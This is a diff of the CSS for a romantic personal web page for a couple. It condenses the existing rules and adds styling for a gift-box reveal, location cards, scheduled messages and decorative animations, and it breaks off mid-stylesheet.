@@ -3,730 +3,893 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <title>Yousef & Noran ❤️</title>
-
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght=300;400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"/>
-
 <style>
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-}
-
-html{
-    scroll-behavior:smooth;
-}
-
-body{
-    font-family:'Poppins',sans-serif;
-    background:linear-gradient(135deg,#ff8fc7,#ff5fa2,#ffb3d9);
-    min-height:100vh;
-    overflow-x:hidden;
-    padding:60px 20px;
-    position:relative;
-}
-
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{font-family:'Poppins',sans-serif;background:linear-gradient(135deg,#ff8fc7,#ff5fa2,#ffb3d9);min-height:100vh;overflow-x:hidden;padding:60px 20px;position:relative;}
 /* FLOAT HEARTS */
-.heart{
-    position:fixed;
-    color:white;
-    opacity:0.15;
-    pointer-events:none;
-    animation:float linear infinite;
-}
-
+.heart{position:fixed;color:white;opacity:0.15;pointer-events:none;animation:float linear infinite;}
 .heart:nth-child(1){left:5%;top:100%;font-size:25px;animation-duration:10s;}
 .heart:nth-child(2){left:20%;top:110%;font-size:35px;animation-duration:16s;}
 .heart:nth-child(3){left:40%;top:105%;font-size:20px;animation-duration:12s;}
 .heart:nth-child(4){left:60%;top:115%;font-size:28px;animation-duration:15s;}
 .heart:nth-child(5){left:80%;top:120%;font-size:38px;animation-duration:18s;}
-
-@keyframes float{
-    from{ transform:translateY(0) rotate(0deg); }
-    to{ transform:translateY(-150vh) rotate(360deg); }
-}
-
+@keyframes float{from{transform:translateY(0) rotate(0deg);}to{transform:translateY(-150vh) rotate(360deg);}}
 /* MAIN CONTAINER */
-.container{
-    width:100%;
-    max-width:1000px;
-    margin:auto;
-    background:rgba(255,255,255,0.12);
-    backdrop-filter:blur(18px);
-    -webkit-backdrop-filter:blur(18px);
-    border-radius:40px;
-    padding:60px 35px;
-    box-shadow:0 15px 50px rgba(0,0,0,0.15);
-}
+.container{width:100%;max-width:1000px;margin:auto;background:rgba(255,255,255,0.12);backdrop-filter:blur(18px);-webkit-backdrop-filter:blur(18px);border-radius:40px;padding:60px 35px;box-shadow:0 15px 50px rgba(0,0,0,0.15);animation:fadeInUp 1s ease;}
+@keyframes fadeInUp{from{opacity:0;transform:translateY(40px);}to{opacity:1;transform:translateY(0);}}
+h1{text-align:center;color:white;font-size:4rem;margin-bottom:50px;text-shadow:0 4px 10px rgba(0,0,0,0.1);animation:pulse 2s infinite;}
+@keyframes pulse{0%,100%{transform:scale(1);}50%{transform:scale(1.02);}}
+.timer-box{text-align:center;margin-bottom:60px;}
+.timer{display:inline-block;background:rgba(255,255,255,0.18);padding:25px 35px;border-radius:25px;color:white;font-size:2rem;font-weight:700;box-shadow:0 8px 32px rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.2);animation:glow 2s ease-in-out infinite alternate;}
+@keyframes glow{from{box-shadow:0 8px 32px rgba(255,255,255,0.05);}to{box-shadow:0 8px 40px rgba(255,255,255,0.25);}}
+.love-title{text-align:center;color:white;font-size:2rem;margin-bottom:30px;font-weight:700;}
 
-h1{
-    text-align:center;
-    color:white;
-    font-size:4rem;
-    margin-bottom:50px;
-    text-shadow: 0 4px 10px rgba(0,0,0,0.1);
-}
+/* GIFT MESSAGE */
+.gift-container{text-align:center;margin-bottom:40px;position:relative;}
+.gift-box{width:180px;height:180px;margin:0 auto 20px;position:relative;cursor:pointer;transition:transform 0.4s cubic-bezier(0.175,0.885,0.32,1.275);}
+.gift-box:hover{transform:scale(1.1);}
+.gift-box .gift-body{width:100%;height:120px;background:linear-gradient(135deg,#ff4f95,#ff8fc7);border-radius:0 0 15px 15px;position:absolute;bottom:0;box-shadow:0 10px 30px rgba(255,79,149,0.4);}
+.gift-box .gift-lid{width:110%;height:50px;background:linear-gradient(135deg,#ff2e7a,#ff5fa2);border-radius:10px;position:absolute;top:10px;left:-5%;box-shadow:0 5px 20px rgba(0,0,0,0.2);transition:all 0.6s cubic-bezier(0.68,-0.55,0.265,1.55);z-index:2;}
+.gift-box .gift-ribbon{width:30px;height:100%;background:#fff;position:absolute;left:50%;transform:translateX(-50%);top:0;border-radius:5px;}
+.gift-box .gift-bow{width:60px;height:60px;background:#fff;position:absolute;top:-20px;left:50%;transform:translateX(-50%);border-radius:50%;box-shadow:0 3px 10px rgba(0,0,0,0.1);}
+.gift-box .gift-bow::before,.gift-box .gift-bow::after{content:'';width:40px;height:40px;background:#fff;position:absolute;border-radius:50%;top:10px;}
+.gift-box .gift-bow::before{left:-25px;}
+.gift-box .gift-bow::after{right:-25px;}
+.gift-box.opened .gift-lid{transform:translateY(-200px) rotate(-15deg);opacity:0;}
+.gift-message{background:rgba(255,255,255,0.15);color:white;padding:35px;border-radius:30px;line-height:2.1;font-size:1.1rem;border:1px solid rgba(255,255,255,0.1);max-height:0;overflow:hidden;opacity:0;transition:all 0.8s cubic-bezier(0.175,0.885,0.32,1.275);}
+.gift-message.show{max-height:500px;opacity:1;margin-top:20px;}
 
-.timer-box{
-    text-align:center;
-    margin-bottom:60px;
-}
-
-.timer{
-    display:inline-block;
-    background:rgba(255,255,255,0.18);
-    padding:25px 35px;
-    border-radius:25px;
-    color:white;
-    font-size:2rem;
-    font-weight:700;
-    box-shadow: 0 8px 32px rgba(255, 255, 255, 0.05);
-    border: 1px solid rgba(255,255,255,0.2);
-}
-
-.love-title{
-    text-align:center;
-    color:white;
-    font-size:2rem;
-    margin-bottom:30px;
-    font-weight:700;
-}
-
-.message-box{
-    background:rgba(255,255,255,0.12);
-    color:white;
-    padding:35px;
-    border-radius:30px;
-    line-height:2.1;
-    font-size:1.1rem;
-    border: 1px solid rgba(255,255,255,0.1);
-}
-
-.heal{
-    margin-top:35px;
-    text-align:center;
-    color:white;
-    font-size:1.5rem;
-    font-weight:700;
-}
-
+.heal{margin-top:35px;text-align:center;color:white;font-size:1.5rem;font-weight:700;}
 /* SECTION */
-.section{
-    margin-top:70px;
-    background:rgba(255,255,255,0.12);
-    border-radius:35px;
-    padding:35px;
-    border: 1px solid rgba(255,255,255,0.1);
-}
-
-.section h2{
-    text-align:center;
-    color:white;
-    margin-bottom:25px;
-    font-size:2rem;
-}
-
+.section{margin-top:70px;background:rgba(255,255,255,0.12);border-radius:35px;padding:35px;border:1px solid rgba(255,255,255,0.1);animation:fadeInUp 0.8s ease;transition:0.4s;}
+.section:hover{background:rgba(255,255,255,0.15);transform:translateY(-3px);box-shadow:0 15px 40px rgba(0,0,0,0.1);}
+.section h2{text-align:center;color:white;margin-bottom:25px;font-size:2rem;}
 /* LOVE LIST */
-.love-list{
-    display:flex;
-    flex-direction:column;
-    gap:18px;
-}
-
-.love-list div{
-    background:rgba(255,255,255,0.15);
-    padding:20px;
-    border-radius:20px;
-    color:white;
-    font-size:1.1rem;
-    transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-    border: 1px solid rgba(255,255,255,0.05);
-}
-
-.love-list div:hover{
-    transform:scale(1.03);
-    background:rgba(255,255,255,0.25);
-}
-
+.love-list{display:flex;flex-direction:column;gap:18px;}
+.love-list div{background:rgba(255,255,255,0.15);padding:20px;border-radius:20px;color:white;font-size:1.1rem;transition:0.3s cubic-bezier(0.175,0.885,0.32,1.275);border:1px solid rgba(255,255,255,0.05);position:relative;overflow:hidden;}
+.love-list div::before{content:'';position:absolute;left:0;top:0;height:100%;width:0;background:linear-gradient(90deg,rgba(255,255,255,0.3),transparent);transition:width 0.4s;}
+.love-list div:hover::before{width:100%;}
+.love-list div:hover{transform:scale(1.03) translateX(10px);background:rgba(255,255,255,0.25);box-shadow:0 5px 20px rgba(255,255,255,0.2);}
 /* BUTTONS */
-.btns{
-    display:flex;
-    justify-content:center;
-    gap:20px;
-    flex-wrap:wrap;
-    margin-top:25px;
-}
-
-.btns button{
-    border:none;
-    background:white;
-    color:#ff4f95;
-    padding:16px 40px;
-    border-radius:50px;
-    font-size:1.1rem;
-    font-weight:700;
-    cursor:pointer;
-    transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-}
-
-.btns button:hover{
-    transform:scale(1.08);
-    box-shadow: 0 6px 20px rgba(0,0,0,0.15);
-}
-
+.btns{display:flex;justify-content:center;gap:20px;flex-wrap:wrap;margin-top:25px;}
+.btns button{border:none;background:white;color:#ff4f95;padding:16px 40px;border-radius:50px;font-size:1.1rem;font-weight:700;cursor:pointer;transition:0.3s cubic-bezier(0.175,0.885,0.32,1.275);box-shadow:0 4px 15px rgba(0,0,0,0.1);position:relative;overflow:hidden;}
+.btns button::before{content:'';position:absolute;top:50%;left:50%;width:0;height:0;background:rgba(255,79,149,0.2);border-radius:50%;transform:translate(-50%,-50%);transition:width 0.6s,height 0.6s;}
+.btns button:hover::before{width:300px;height:300px;}
+.btns button:hover{transform:scale(1.08);box-shadow:0 6px 20px rgba(0,0,0,0.15);}
+.btns button:active{transform:scale(0.95);}
 /* LOVE EXPLOSION & TRANSPARENT POPUP */
-#loveExplosion{
-    position:fixed;
-    inset:0;
-    pointer-events:none;
-    overflow:hidden;
-    z-index:999;
-}
-
-.love-text{
-    position:fixed;
-    top:50%;
-    left:50%;
-    transform:translate(-50%,-50%) scale(0.8);
-    background: transparent; /* خلفية شفافة بالكامل */
-    color: white;
-    font-size: 3.5rem;
-    font-weight: 700;
-    text-align: center;
-    white-space: nowrap;
-    opacity: 0;
-    pointer-events: none;
-    transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-    z-index: 9999;
-    text-shadow: 0 0 20px rgba(255, 79, 149, 0.8), 0 4px 20px rgba(0, 0, 0, 0.4); /* ظل ممتاز يمنح النص بريقاً ووضوحاً */
-}
-
-.love-text.active {
-    opacity: 1;
-    transform: translate(-50%,-50%) scale(1);
-}
-
+#loveExplosion{position:fixed;inset:0;pointer-events:none;overflow:hidden;z-index:999;}
+.love-text{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%) scale(0.8);background:transparent;color:white;font-size:3.5rem;font-weight:700;text-align:center;white-space:nowrap;opacity:0;pointer-events:none;transition:all 0.5s cubic-bezier(0.175,0.885,0.32,1.275);z-index:9999;text-shadow:0 0 20px rgba(255,79,149,0.8),0 4px 20px rgba(0,0,0,0.4);}
+.love-text.active{opacity:1;transform:translate(-50%,-50%) scale(1);}
 /* SOCIALS */
-.socials{
-    display:flex;
-    justify-content:center;
-    gap:20px;
-    flex-wrap:wrap;
-}
-
-.socials a{
-    width:65px;
-    height:65px;
-    border-radius:50%;
-    background:white;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    color:#ff4f95;
-    text-decoration:none;
-    font-size:1.6rem;
-    transition: 0.3s ease;
-    box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-}
-
-.socials a:hover{
-    transform:scale(1.12) rotate(8deg);
-}
-
-.map-link{
-    display:block;
-    margin-top:25px;
-    text-align:center;
-    color:white;
-    text-decoration:none;
-    font-weight:700;
-    font-size:1.2rem;
-}
-
+.socials{display:flex;justify-content:center;gap:20px;flex-wrap:wrap;}
+.socials a{width:65px;height:65px;border-radius:50%;background:white;display:flex;justify-content:center;align-items:center;color:#ff4f95;text-decoration:none;font-size:1.6rem;transition:0.3s ease;box-shadow:0 4px 10px rgba(0,0,0,0.1);position:relative;overflow:hidden;}
+.socials a::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,#ff4f95,#ff8fc7);opacity:0;transition:opacity 0.3s;border-radius:50%;}
+.socials a:hover::after{opacity:1;}
+.socials a:hover{color:white;transform:scale(1.12) rotate(8deg);box-shadow:0 8px 25px rgba(255,79,149,0.4);}
+.socials a i{position:relative;z-index:1;}
+.map-link{display:block;margin-top:25px;text-align:center;color:white;text-decoration:none;font-weight:700;font-size:1.2rem;transition:0.3s;}
+.map-link:hover{transform:scale(1.05);text-shadow:0 0 15px rgba(255,255,255,0.5);}
 /* INPUTS & TEXTAREAS */
-textarea{
-    width:100%;
-    border: 1px solid rgba(255,255,255,0.2);
-    background: rgba(255,255,255,0.9);
-    outline:none;
-    border-radius:20px;
-    padding:20px;
-    font-family:'Poppins', sans-serif;
-    resize:none;
-    color: #333;
-    font-size: 1rem;
-    transition: 0.3s;
-}
-
-textarea:focus{
-    background: #ffffff;
-    box-shadow: 0 0 15px rgba(255,255,255,0.5);
-}
-
-.send-btn{
-    border:none;
-    background:white;
-    color:#ff4f95;
-    padding:14px 35px;
-    border-radius:20px;
-    margin-top:20px;
-    font-weight:700;
-    font-size: 1rem;
-    cursor:pointer;
-    transition: 0.3s;
-    box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-}
-
-.send-btn:hover{
-    background: #fff0f5;
-    transform: translateY(-2px);
-}
-
+textarea{width:100%;border:1px solid rgba(255,255,255,0.2);background:rgba(255,255,255,0.9);outline:none;border-radius:20px;padding:20px;font-family:'Poppins',sans-serif;resize:none;color:#333;font-size:1rem;transition:0.3s;}
+textarea:focus{background:#ffffff;box-shadow:0 0 20px rgba(255,255,255,0.6);transform:translateY(-2px);}
+.send-btn{border:none;background:white;color:#ff4f95;padding:14px 35px;border-radius:20px;margin-top:20px;font-weight:700;font-size:1rem;cursor:pointer;transition:0.3s;box-shadow:0 4px 10px rgba(0,0,0,0.1);position:relative;overflow:hidden;}
+.send-btn:hover{background:#fff0f5;transform:translateY(-2px);box-shadow:0 6px 20px rgba(255,79,149,0.3);}
+.send-btn:active{transform:scale(0.95);}
 /* MEMORY SYSTEM */
-.memory-header{
-    text-align:center;
-    margin-bottom:25px;
-}
-
-.memory-header p{
-    color:white;
-}
-
-.create-memory-btn{
-    width:100%;
-    border:none;
-    background:white;
-    color:#ff4f95;
-    padding:18px;
-    border-radius:22px;
-    font-size:1.1rem;
-    font-weight:700;
-    cursor:pointer;
-    transition: 0.3s;
-    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-}
-
-.create-memory-btn:hover{
-    background: #fff0f5;
-    transform: translateY(-2px);
-}
-
-.memory-form{
-    margin-top:25px;
-    background:rgba(255,255,255,0.15);
-    padding:25px;
-    border-radius:25px;
-    border: 1px solid rgba(255,255,255,0.2);
-}
-
-/* ADJUSTED UI CHOOSE FILE BUTTON */
-.custom-file-upload{
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    gap:10px;
-    background: linear-gradient(135deg, #ffffff, #fff0f5);
-    color:#ff4f95;
-    padding:16px;
-    border-radius:20px;
-    margin-top:20px;
-    cursor:pointer;
-    font-weight:700;
-    transition: 0.3s all ease;
-    border: 2px dashed #ff4f95;
-}
-
-.custom-file-upload:hover{
-    background: #ff4f95;
-    color: white;
-    border-color: transparent;
-    box-shadow: 0 5px 15px rgba(255, 79, 149, 0.3);
-}
-
-.custom-file-upload input{
-    display:none;
-}
-
-/* IMAGE STATUS NOTIFICATION */
-.upload-status {
-    display: none;
-    text-align: center;
-    color: #fff;
-    background: rgba(0, 180, 100, 0.8);
-    padding: 8px 15px;
-    border-radius: 50px;
-    font-size: 0.9rem;
-    font-weight: 600;
-    margin-top: 10px;
-    animation: fadeIn 0.3s ease;
-}
-
-/* IMAGE PREVIEW BOX */
-.image-preview-container {
-    display: none;
-    margin-top: 15px;
-    text-align: center;
-    border-radius: 20px;
-    overflow: hidden;
-    background: rgba(0,0,0,0.1);
-    padding: 10px;
-}
-
-.image-preview-container img {
-    max-height: 200px;
-    max-width: 100%;
-    border-radius: 15px;
-    object-fit: contain;
-}
-
-.save-memory-btn{
-    width:100%;
-    border:none;
-    background:#ff4f95;
-    color:white;
-    padding:18px;
-    border-radius:20px;
-    margin-top:20px;
-    font-weight:700;
-    font-size: 1rem;
-    cursor:pointer;
-    transition: 0.3s;
-    box-shadow: 0 4px 15px rgba(255, 79, 149, 0.4);
-}
-
-.save-memory-btn:hover{
-    background: #e03b7e;
-    transform: translateY(-2px);
-}
-
-.memories-container{
-    margin-top:30px;
-    display:flex;
-    flex-direction:column;
-    gap:25px;
-}
-
-.memory-card{
-    background:rgba(255,255,255,0.15);
-    border-radius:25px;
-    overflow:hidden;
-    border: 1px solid rgba(255,255,255,0.15);
-    box-shadow: 0 10px 30px rgba(0,0,0,0.05);
-}
-
-/* CONTAIN PATTERN FOR MEMORIES IMAGES - NOT CROPPED */
-.memory-card img{
-    width:100%;
-    height:380px;
-    object-fit:contain;
-    background: rgba(0, 0, 0, 0.15);
-    border-bottom: 1px solid rgba(255,255,255,0.1);
-}
-
-.memory-content{
-    padding:25px;
-}
-
-.memory-text{
-    color:white;
-    line-height:2;
-    font-size: 1.1rem;
-    font-weight: 500;
-}
-
-.delete-btn{
-    border:none;
-    background:#ff295f;
-    color:white;
-    padding:10px 22px;
-    border-radius:15px;
-    margin-top:20px;
-    font-weight: 600;
-    cursor:pointer;
-    transition: 0.3s;
-}
-
-.delete-btn:hover{
-    background: #d6184a;
-}
-
-.comment-box{
-    margin-top:25px;
-    border-top: 1px solid rgba(255,255,255,0.1);
-    padding-top: 20px;
-}
-
-.comment-box textarea {
-    background: rgba(255,255,255,0.85);
-    padding: 12px 20px;
-    border-radius: 15px;
-}
-
-.comment-send-btn{
-    border:none;
-    background:white;
-    color:#ff4f95;
-    padding:10px 25px;
-    border-radius:15px;
-    margin-top:12px;
-    font-weight:700;
-    cursor:pointer;
-    transition: 0.3s;
-}
-
-.comment-send-btn:hover{
-    background: #fff0f5;
-    transform: translateY(-1px);
-}
-
-.comment{
-    background:rgba(255,255,255,0.15);
-    padding:15px;
-    border-radius:15px;
-    color:white;
-    margin-top:12px;
-    border-left: 4px solid white;
-    animation: fadeIn 0.3s ease;
-}
-
-/* SUCCESS TOAST TRANSLATION */
-.toast {
-    position: fixed;
-    bottom: 30px;
-    right: 30px;
-    background: #4caf50;
-    color: white;
-    padding: 15px 30px;
-    border-radius: 15px;
-    font-weight: 600;
-    box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-    display: none;
-    z-index: 10000;
-    animation: slideUp 0.4s ease forwards;
-}
-
-@keyframes fadeIn {
-    from { opacity: 0; transform: translateY(5px); }
-    to { opacity: 1; transform: translateY(0); }
-}
-
-@keyframes slideUp {
-    from { transform: translateY(50px); opacity: 0; }
-    to { transform: translateY(0); opacity: 1; }
-}
-
+.memory-header{text-align:center;margin-bottom:25px;}
+.memory-header p{color:white;}
+.create-memory-btn{width:100%;border:none;background:white;color:#ff4f95;padding:18px;border-radius:22px;font-size:1.1rem;font-weight:700;cursor:pointer;transition:0.3s;box-shadow:0 4px 15px rgba(0,0,0,0.1);}
+.create-memory-btn:hover{background:#fff0f5;transform:translateY(-2px);box-shadow:0 8px 25px rgba(255,79,149,0.2);}
+.memory-form{margin-top:25px;background:rgba(255,255,255,0.15);padding:25px;border-radius:25px;border:1px solid rgba(255,255,255,0.2);animation:slideDown 0.4s ease;}
+@keyframes slideDown{from{opacity:0;transform:translateY(-20px);}to{opacity:1;transform:translateY(0);}}
+.custom-file-upload{display:flex;justify-content:center;align-items:center;gap:10px;background:linear-gradient(135deg,#ffffff,#fff0f5);color:#ff4f95;padding:16px;border-radius:20px;margin-top:20px;cursor:pointer;font-weight:700;transition:0.3s all ease;border:2px dashed #ff4f95;}
+.custom-file-upload:hover{background:#ff4f95;color:white;border-color:transparent;box-shadow:0 5px 15px rgba(255,79,149,0.3);transform:translateY(-2px);}
+.custom-file-upload input{display:none;}
+.upload-status{display:none;text-align:center;color:#fff;background:rgba(0,180,100,0.8);padding:8px 15px;border-radius:50px;font-size:0.9rem;font-weight:600;margin-top:10px;animation:fadeIn 0.3s ease;}
+.image-preview-container{display:none;margin-top:15px;text-align:center;border-radius:20px;overflow:hidden;background:rgba(0,0,0,0.1);padding:10px;}
+.image-preview-container img{max-height:200px;max-width:100%;border-radius:15px;object-fit:contain;}
+.save-memory-btn{width:100%;border:none;background:#ff4f95;color:white;padding:18px;border-radius:20px;margin-top:20px;font-weight:700;font-size:1rem;cursor:pointer;transition:0.3s;box-shadow:0 4px 15px rgba(255,79,149,0.4);position:relative;overflow:hidden;}
+.save-memory-btn::before{content:'';position:absolute;top:50%;left:50%;width:0;height:0;background:rgba(255,255,255,0.3);border-radius:50%;transform:translate(-50%,-50%);transition:width 0.6s,height 0.6s;}
+.save-memory-btn:hover::before{width:400px;height:400px;}
+.save-memory-btn:hover{background:#e03b7e;transform:translateY(-2px);}
+.save-memory-btn:active{transform:scale(0.98);}
+.memories-container{margin-top:30px;display:flex;flex-direction:column;gap:25px;}
+.memory-card{background:rgba(255,255,255,0.15);border-radius:25px;overflow:hidden;border:1px solid rgba(255,255,255,0.15);box-shadow:0 10px 30px rgba(0,0,0,0.05);animation:fadeInUp 0.5s ease;transition:0.3s;}
+.memory-card:hover{transform:translateY(-5px);box-shadow:0 15px 40px rgba(0,0,0,0.1);}
+.memory-card img{width:100%;height:380px;object-fit:contain;background:rgba(0,0,0,0.15);border-bottom:1px solid rgba(255,255,255,0.1);}
+.memory-content{padding:25px;}
+.memory-text{color:white;line-height:2;font-size:1.1rem;font-weight:500;}
+.delete-btn{border:none;background:#ff295f;color:white;padding:10px 22px;border-radius:15px;margin-top:20px;font-weight:600;cursor:pointer;transition:0.3s;}
+.delete-btn:hover{background:#d6184a;transform:scale(1.05);}
+.comment-box{margin-top:25px;border-top:1px solid rgba(255,255,255,0.1);padding-top:20px;}
+.comment-box textarea{background:rgba(255,255,255,0.85);padding:12px 20px;border-radius:15px;}
+.comment-send-btn{border:none;background:white;color:#ff4f95;padding:10px 25px;border-radius:15px;margin-top:12px;font-weight:700;cursor:pointer;transition:0.3s;}
+.comment-send-btn:hover{background:#fff0f5;transform:translateY(-1px);box-shadow:0 4px 15px rgba(255,79,149,0.2);}
+.comment{background:rgba(255,255,255,0.15);padding:15px;border-radius:15px;color:white;margin-top:12px;border-left:4px solid white;animation:fadeIn 0.3s ease;transition:0.3s;}
+.comment:hover{background:rgba(255,255,255,0.25);transform:translateX(5px);}
+/* LOCATION SECTION */
+.location-section{display:grid;grid-template-columns:1fr 1fr;gap:25px;margin-top:20px;}
+@media(max-width:768px){.location-section{grid-template-columns:1fr;}}
+.location-card{background:rgba(255,255,255,0.15);border-radius:25px;padding:25px;border:1px solid rgba(255,255,255,0.1);text-align:center;position:relative;transition:0.4s;overflow:hidden;}
+.location-card::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle,rgba(255,255,255,0.1),transparent 70%);opacity:0;transition:opacity 0.4s;}
+.location-card:hover::before{opacity:1;}
+.location-card:hover{transform:translateY(-8px);box-shadow:0 15px 40px rgba(0,0,0,0.15);}
+.location-card h3{color:white;margin-bottom:15px;font-size:1.3rem;position:relative;z-index:1;}
+.location-card p{color:rgba(255,255,255,0.8);font-size:0.95rem;position:relative;z-index:1;}
+.location-card .loc-icon{font-size:3rem;margin-bottom:15px;color:white;animation:bounce 2s infinite;position:relative;z-index:1;}
+@keyframes bounce{0%,100%{transform:translateY(0);}50%{transform:translateY(-10px);}}
+.location-card .remove-loc{position:absolute;top:10px;right:10px;width:30px;height:30px;background:rgba(255,41,95,0.8);color:white;border:none;border-radius:50%;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:1rem;transition:0.3s;opacity:0;z-index:2;}
+.location-card:hover .remove-loc{opacity:1;}
+.location-card .remove-loc:hover{background:#ff295f;transform:scale(1.1) rotate(90deg);}
+.location-card .set-loc-btn{border:none;background:white;color:#ff4f95;padding:12px 30px;border-radius:20px;margin-top:15px;font-weight:700;cursor:pointer;transition:0.3s;position:relative;z-index:1;}
+.location-card .set-loc-btn:hover{background:#fff0f5;transform:scale(1.05);box-shadow:0 4px 15px rgba(0,0,0,0.1);}
+.distance-display{background:linear-gradient(135deg,rgba(255,255,255,0.2),rgba(255,255,255,0.1));border-radius:20px;padding:20px;margin-top:20px;text-align:center;color:white;font-size:1.2rem;font-weight:700;border:1px solid rgba(255,255,255,0.2);animation:pulse 2s infinite;}
+.distance-display span{color:#fff0f5;font-size:1.5rem;}
+/* SCHEDULED MESSAGES */
+.schedule-section{margin-top:70px;background:rgba(255,255,255,0.12);border-radius:35px;padding:35px;border:1px solid rgba(255,255,255,0.1);transition:0.4s;}
+.schedule-section:hover{background:rgba(255,255,255,0.15);transform:translateY(-3px);box-shadow:0 15px 40px rgba(0,0,0,0.1);}
+.schedule-form{display:grid;grid-template-columns:2fr 1fr auto;gap:15px;align-items:end;margin-bottom:25px;}
+@media(max-width:768px){.schedule-form{grid-template-columns:1fr;}}
+.schedule-form input{width:100%;border:1px solid rgba(255,255,255,0.2);background:rgba(255,255,255,0.9);outline:none;border-radius:15px;padding:15px;font-family:'Poppins',sans-serif;color:#333;font-size:1rem;transition:0.3s;}
+.schedule-form input:focus{background:#ffffff;box-shadow:0 0 15px rgba(255,255,255,0.5);transform:translateY(-2px);}
+.schedule-btn{border:none;background:white;color:#ff4f95;padding:14px 30px;border-radius:15px;font-weight:700;cursor:pointer;transition:0.3s;box-shadow:0 4px 10px rgba(0,0,0,0.1);position:relative;overflow:hidden;}
+.schedule-btn::before{content:'';position:absolute;top:50%;left:50%;width:0;height:0;background:rgba(255,79,149,0.2);border-radius:50%;transform:translate(-50%,-50%);transition:width 0.6s,height 0.6s;}
+.schedule-btn:hover::before{width:200px;height:200px;}
+.schedule-btn:hover{background:#fff0f5;transform:translateY(-2px);box-shadow:0 6px 20px rgba(255,79,149,0.2);}
+.schedule-btn:active{transform:scale(0.95);}
+.scheduled-list{display:flex;flex-direction:column;gap:15px;}
+.scheduled-item{background:rgba(255,255,255,0.15);border-radius:20px;padding:20px;border:1px solid rgba(255,255,255,0.1);display:flex;justify-content:space-between;align-items:center;animation:fadeInUp 0.5s ease;transition:0.3s;}
+.scheduled-item:hover{background:rgba(255,255,255,0.2);transform:translateX(5px);box-shadow:0 5px 20px rgba(0,0,0,0.1);}
+.scheduled-item .msg-text{color:white;font-size:1rem;flex:1;}
+.scheduled-item .msg-timer{color:#fff0f5;font-weight:700;font-size:1.1rem;min-width:100px;text-align:center;}
+.scheduled-item .msg-status{padding:5px 15px;border-radius:15px;font-size:0.85rem;font-weight:600;}
+.msg-status.waiting{background:rgba(255,193,7,0.3);color:#fff3cd;}
+.msg-status.revealed{background:rgba(76,175,80,0.3);color:#c8e6c9;}
+/* TOAST */
+.toast{position:fixed;bottom:30px;right:30px;background:#4caf50;color:white;padding:15px 30px;border-radius:15px;font-weight:600;box-shadow:0 5px 15px rgba(0,0,0,0.2);display:none;z-index:10000;animation:slideUp 0.4s ease forwards;}
+@keyframes fadeIn{from{opacity:0;transform:translateY(5px);}to{opacity:1;transform:translateY(0);}}
+@keyframes slideUp{from{transform:translateY(50px);opacity:0;}to{transform:translateY(0);opacity:1;}}
 /* MOBILE */
 @media(max-width:768px){
-    h1{ font-size:2.5rem; }
-    .timer{ font-size:1.2rem; line-height:2; }
-    .container{ padding:40px 20px; }
-    .memory-card img{ height:250px; }
-    .love-text { font-size: 2rem; }
-    .toast { left: 20px; right: 20px; bottom: 20px; text-align: center; }
+h1{font-size:2.5rem;}
+.timer{font-size:1.2rem;line-height:2;padding:15px 20px;}
+.container{padding:40px 20px;}
+.memory-card img{height:250px;}
+.love-text{font-size:2rem;}
+.toast{left:20px;right:20px;bottom:20px;text-align:center;}
+.gift-box{width:140px;height:140px;}
+.gift-box .gift-body{height:90px;}
+.gift-box .gift-lid{height:40px;}
 }
+/* PARTICLES */
+.particle{position:fixed;pointer-events:none;z-index:9998;animation:particleFloat 3s ease-out forwards;}
+@keyframes particleFloat{0%{transform:translateY(0) scale(1);opacity:1;}100%{transform:translateY(-100px) scale(0);opacity:0;}}
+/* FLOATING EMOJI */
+.float-emoji{position:fixed;pointer-events:none;z-index:9997;font-size:2rem;animation:floatEmoji 4s ease-in-out infinite;opacity:0.6;}
+@keyframes floatEmoji{0%,100%{transform:translateY(0) rotate(0deg);}50%{transform:translateY(-30px) rotate(10deg);}}
+/* SHIMMER EFFECT */
+.shimmer{background:linear-gradient(90deg,transparent,rgba(255,255,255,0.4),transparent);background-size:200% 100%;animation:shimmer 2s infinite;}
+@keyframes shimmer{0%{background-position:-200% 0;}100%{background-position:200% 0;}}
+/* RIPPLE EFFECT */
+.ripple{position:absolute;border-radius:50%;background:rgba(255,255,255,0.6);transform:scale(0);animation:ripple 0.6s linear;pointer-events:none;}
+@keyframes ripple{to{transform:scale(4);opacity:0;}}
+/* SCROLLBAR */
+::-webkit-scrollbar{width:8px;}
+::-webkit-scrollbar-track{background:rgba(255,255,255,0.1);border-radius:4px;}
+::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.3);border-radius:4px;}
+::-webkit-scrollbar-thumb:hover{background:rgba(255,255,255,0.5);}
+/* ENTRANCE ANIMATIONS */
+.entrance-left{animation:slideInLeft 0.8s ease;}
+.entrance-right{animation:slideInRight 0.8s ease;}
+@keyframes slideInLeft{from{opacity:0;transform:translateX(-50px);}to{opacity:1;transform:translateX(0);}}
+@keyframes slideInRight{from{opacity:0;transform:translateX(50px);}to{opacity:1;transform:translateX(0);}}
+/* TYPING EFFECT */
+.typing-cursor::after{content:'|';animation:blink 1s infinite;}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:0;}}
+/* HEART BEAT */
+.heartbeat{animation:heartbeat 1.5s ease-in-out infinite;}
